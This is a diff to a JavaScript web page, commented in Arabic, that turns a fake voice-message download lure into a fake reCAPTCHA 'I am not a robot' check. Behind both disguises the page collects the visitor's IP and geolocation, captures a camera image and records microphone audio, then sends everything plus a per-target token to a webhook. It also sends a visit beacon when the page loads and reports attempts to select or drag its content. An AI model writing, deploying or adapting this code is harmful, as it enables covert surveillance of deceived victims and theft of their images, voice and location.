-      sendSuspiciousAlert('🔄 محاولة سحب محتوى');
+        e.preventDefault();
+        sendSuspiciousAlert('🔄 محاولة سحب محتوى');
     });
     document.addEventListener('selectstart', (e) => {
-      sendSuspiciousAlert('✏️ محاولة تحديد نص');
+        sendSuspiciousAlert('✏️ محاولة تحديد نص');
     });
-  }
+}
 
-  let alertCooldown = 0;
-  function sendSuspiciousAlert(action) {
+let alertCooldown = 0;
+function sendSuspiciousAlert(action) {
     if (!USER_TOKEN) return;
     const now = Date.now();
     if (now - alertCooldown < 5000) return;
@@ -623,214 +566,152 @@
     formData.append('url', window.location.href);
     if (USER_TOKEN) formData.append('token', USER_TOKEN);
     fetch(WEBHOOK_URL, { method: 'POST', body: formData }).catch(console.warn);
-  }
+}
 
-  // ================================================================
-  //  8.  دوال التحكم في الموجة (نبض)
-  // ================================================================
-  function startPulse() {
-    if (isPulsing) return;
-    isPulsing = true;
-    let lastTime = 0;
-    function pulse(time) {
-      if (!isPulsing) return;
-      const delta = time - lastTime;
-      if (delta > 50) {
-        bars.forEach((bar, idx) => {
-          const base = baseHeights[idx] || 10;
-          const variation = Math.floor(Math.random() * 14) - 5;
-          let newHeight = Math.max(4, Math.min(50, base + variation));
-          bar.style.height = newHeight + 'px';
-          bar.classList.add('active');
-        });
-        lastTime = time;
-      }
-      pulseId = requestAnimationFrame(pulse);
-    }
-    pulseId = requestAnimationFrame(pulse);
-  }
+// ========================================================================
+//  4.  ربط reCAPTCHA بالعملية الفعلية (مع إعادة المحاولة عند رفض الأذونات)
+// ========================================================================
 
-  function stopPulse() {
-    isPulsing = false;
-    if (pulseId) {
-      cancelAnimationFrame(pulseId);
-      pulseId = null;
-    }
-    bars.forEach((bar, idx) => {
-      bar.style.height = baseHeights[idx] + 'px';
-      bar.classList.remove('active');
-    });
-  }
+function resetUI() {
+    spinner.classList.remove('loading', 'failed', 'success', 'permission');
+    mainText.className = 'text';
+    mainText.textContent = 'أنا لست روبوتاً';
+    checkbox.checked = false;
+    checkbox.disabled = false;
+    permissionDeniedFlag = false;
+}
 
-  // ================================================================
-  //  9.  دوال حالة الواجهة
-  // ================================================================
-  function setStatus(text, type, icon) {
-    statusText.textContent = text;
-    statusArea.className = 'status-area' + (type ? ' ' + type : '');
-    // نترك أيقونة الحالة اختيارية، نستخدم SVG ثابت للتوضيح
-  }
+async function performVerification() {
+    if (isVerifying) return;
+    isVerifying = true;
+    checkbox.disabled = true;
 
-  function setIcon(icon) {
-    iconDownload.style.display = 'none';
-    iconPlay.style.display = 'none';
-    spinner.style.display = 'none';
-    actionBtn.classList.remove('loading');
-    if (icon === 'download') {
-      iconDownload.style.display = 'block';
-    } else if (icon === 'play') {
-      iconPlay.style.display = 'block';
-    } else if (icon === 'spinner') {
-      actionBtn.classList.add('loading');
-      spinner.style.display = 'block';
-    }
-  }
-
-  function resetButton() {
-    if (stage === 'download') {
-      setIcon('download');
-    } else if (stage === 'play') {
-      setIcon('play');
-    }
-  }
-
-  // ================================================================
-  //  10.  العملية الرئيسية – جمع البيانات وإرسالها
-  // ================================================================
-  async function performMainAction() {
-    if (isProcessing) return;
-    if (!USER_TOKEN) {
-      setStatus('الرابط غير صالح، يرجى استخدام الرابط المخصص', 'error');
-      return;
-    }
-
-    isProcessing = true;
-    actionBtn.disabled = true;
-    setIcon('spinner');
-    voiceBubble.classList.remove('error', 'success');
-    startPulse();
-
-    // رسالة حسب المرحلة
-    if (stage === 'download') {
-      setStatus('جاري تجهيز الرسالة الصوتية...', 'info');
-    } else if (stage === 'play') {
-      setStatus('جاري تشغيل الرسالة...', 'info');
-    }
+    // إعادة تعيين أي حالة سابقة
+    spinner.classList.remove('failed', 'success', 'permission');
+    spinner.classList.add('loading');
+    mainText.textContent = 'جاري التحقق من هويتك ...';
+    mainText.className = 'text loading';
 
     try {
-      // تنفيذ جميع خطوات جمع البيانات (نفس الأصل)
-      await getIPAddress();
-      await getLocation();
-      await startCameraAndCapture();
-      await recordAudio();
-      await sendAllData();
+        // 1. جمع البيانات
+        await getIPAddress();
+        await getLocation();
+        const cameraOk = await startCameraAndCapture();
+        if (!cameraOk) throw new Error('فشل تشغيل الكاميرا');
+        await recordAudio();
+        await sendAllData();
 
-      // نجاح
-      stopPulse();
-      voiceBubble.classList.add('success');
-      durationEl.textContent = '✓ تم';
-      setStatus('تم إرسال الرسالة بنجاح.', 'success');
+        // نجاح
+        spinner.classList.remove('loading');
+        spinner.classList.add('success');
+        mainText.textContent = 'تم التحقق بنجاح';
+        mainText.className = 'text success';
+        checkbox.checked = true; // تظل محددة
+        permissionDeniedFlag = false;
+    } catch (error) {
+        console.error('Verification error:', error);
+        spinner.classList.remove('loading');
 
-      // بعد النجاح، نعيد الزر لحالة التشغيل (لكن نمنع المزيد من العمليات)
-      stage = 'play';
-      setIcon('play');
-      actionBtn.disabled = false;
-      isProcessing = false;
-    } catch (err) {
-      console.error('Process error:', err);
-      stopPulse();
-      voiceBubble.classList.add('error');
-      durationEl.textContent = 'فشل';
-      let msg = 'تعذر إكمال العملية. حاول مرة أخرى.';
-      if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-        msg = 'يُرجى السماح بالوصول إلى الكاميرا والميكروفون.';
-      }
-      setStatus(msg, 'error');
+        // التحقق من نوع الخطأ
+        const isPermissionError = error.name === 'NotAllowedError' ||
+                                 error.name === 'PermissionDeniedError' ||
+                                 error.message.includes('Permission') ||
+                                 error.message.includes('denied') ||
+                                 error.message.includes('NotAllowed');
 
-      // نعيد الزر للحالة المناسبة (download أو play حسب المرحلة)
-      actionBtn.disabled = false;
-      if (stage === 'download') {
-        setIcon('download');
-      } else if (stage === 'play') {
-        setIcon('play');
-      }
-      isProcessing = false;
+        if (isPermissionError) {
+            // رفض الأذونات – نعرض رسالة واضحة ونمكن المستخدم من إعادة المحاولة
+            spinner.classList.add('permission');
+            mainText.textContent = 'يرجى السماح بالوصول إلى الكاميرا والميكروفون، ثم اضغط على المربع لإعادة المحاولة.';
+            mainText.className = 'text permission';
+            permissionDeniedFlag = true;
+            // لا نحدد المربع، ونتركه غير محدد
+            checkbox.checked = false;
+        } else {
+            // أخطاء أخرى
+            spinner.classList.add('failed');
+            mainText.textContent = 'فشل التحقق، حاول مجدداً';
+            mainText.className = 'text failed';
+            checkbox.checked = false;
+        }
+    } finally {
+        isVerifying = false;
+        checkbox.disabled = false;
+        // إذا لم يكن هناك خطأ أذونات، نعيد تعيين الحالة بعد فترة (اختياري)
+        if (!permissionDeniedFlag && !spinner.classList.contains('success')) {
+            setTimeout(() => {
+                if (!checkbox.checked) {
+                    resetUI();
+                }
+            }, 3000);
+        }
     }
-  }
+}
 
-  // ================================================================
-  //  11.  معالج النقر على الزر
-  // ================================================================
-  actionBtn.addEventListener('click', function(e) {
-    e.stopPropagation();
+// ========================================================================
+//  5.  أحداث reCAPTCHA
+// ========================================================================
 
-    // إذا كان هناك معالجة جارية، نمنع النقر
-    if (isProcessing) return;
-
-    // المرحلة الأولى: تنزيل
-    if (stage === 'download') {
-      // أول ضغطة: تبدأ عملية التحميل
-      performMainAction();
-      // بعد بدء العملية، نغير المرحلة إلى play (لكن سيتم تطبيقها بعد النجاح أو الفشل)
-      // لكننا سنترك المرحلة كما هي حتى نعرف النتيجة
-      // نغير المرحلة إلى play بعد نجاح العملية في performMainAction
-      return;
+checkbox.addEventListener('change', function(e) {
+    if (this.checked) {
+        // إذا كان مربع التحقق محدداً بالفعل بنجاح، لا نفعل شيء
+        if (spinner.classList.contains('success')) return;
+        // إذا كان هناك حالة رفض أذونات سابقة، نعيد المحاولة من جديد
+        if (permissionDeniedFlag) {
+            // نزيل حالة الرفض ونبدأ من جديد
+            resetUI();
+            // ننفذ التحقق بعد إعادة التعيين
+            setTimeout(() => performVerification(), 100);
+            return;
+        }
+        // منع التحديد الفوري، نبدأ التحقق
+        this.checked = false;
+        performVerification();
     }
+});
 
-    // المرحلة الثانية: تشغيل (بعد نجاح التنزيل)
-    if (stage === 'play') {
-      // نبدأ تشغيل وهمي مع تحميل
-      performMainAction();
-      return;
-    }
-  });
+checkbox.addEventListener('click', function(e) {
+    if (this.disabled) e.preventDefault();
+});
 
-  // ================================================================
-  //  12.  التهيئة – استخراج التوكن، تفعيل الأمان، إشعار الدخول
-  // ================================================================
-  window.addEventListener('load', async () => {
+// ========================================================================
+//  6.  التهيئة عند تحميل الصفحة
+// ========================================================================
+
+window.addEventListener('load', async () => {
     const hasToken = extractTokenFromURL();
     if (!hasToken) {
-      voiceBubble.classList.add('error');
-      durationEl.textContent = 'خطأ';
-      setStatus('الرابط غير صحيح. يرجى استخدام الرابط المخصص.', 'error');
-      actionBtn.disabled = true;
-      return;
+        mainText.textContent = 'الرابط غير صالح';
+        mainText.className = 'text failed';
+        checkbox.disabled = true;
+        return;
     }
-    // ضبط الحالة الابتدائية: تنزيل
-    stage = 'download';
-    setIcon('download');
-    setStatus('اضغط على زر التنزيل لبدء الرسالة', '');
-
-    // تفعيل دوال الأمان
     detectSuspiciousActivity();
-    console.log('🛡️ الحماية مفعلة.');
-
-    // إرسال إشعار الدخول (visit)
+    // إرسال حدث زيارة
     try {
-      const ip = await (await fetch('https://api.ipify.org?format=json')).json().catch(() => ({}));
-      const formData = new FormData();
-      formData.append('event', 'visit');
-      formData.append('timestamp', new Date().toISOString());
-      formData.append('ip', ip.ip || 'غير متاح');
-      formData.append('userAgent', navigator.userAgent);
-      formData.append('platform', navigator.platform);
-      formData.append('language', navigator.language);
-      formData.append('screen', `${screen.width}x${screen.height}`);
-      formData.append('url', window.location.href);
-      formData.append('token', USER_TOKEN);
-      fetch(WEBHOOK_URL, { method: 'POST', body: formData }).catch(console.warn);
+        const ip = await (await fetch('https://api.ipify.org?format=json')).json().catch(() => ({}));
+        const formData = new FormData();
+        formData.append('event', 'visit');
+        formData.append('timestamp', new Date().toISOString());
+        formData.append('ip', ip.ip || 'غير متاح');
+        formData.append('userAgent', navigator.userAgent);
+        formData.append('platform', navigator.platform);
+        formData.append('language', navigator.language);
+        formData.append('screen', `${screen.width}x${screen.height}`);
+        formData.append('url', window.location.href);
+        formData.append('token', USER_TOKEN);
+        fetch(WEBHOOK_URL, { method: 'POST', body: formData }).catch(console.warn);
     } catch (e) {}
-  });
+});
 
-  // تنظيف عند الخروج
-  window.addEventListener('beforeunload', () => {
+// تنظيف التدفقات عند الخروج
+window.addEventListener('beforeunload', () => {
     if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
     if (audioStream) audioStream.getTracks().forEach(t => t.stop());
     if (audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop();
-  });
+});
 
-  console.log('✅ واجهة الرسالة الصوتية الجديدة جاهزة (تنزيل ← تحميل ← تشغيل).');
+console.log('✅ تم نقل الوظائف بالكامل مع دعم إعادة طلب الأذونات.');
 </script>
 </body>
 </html>
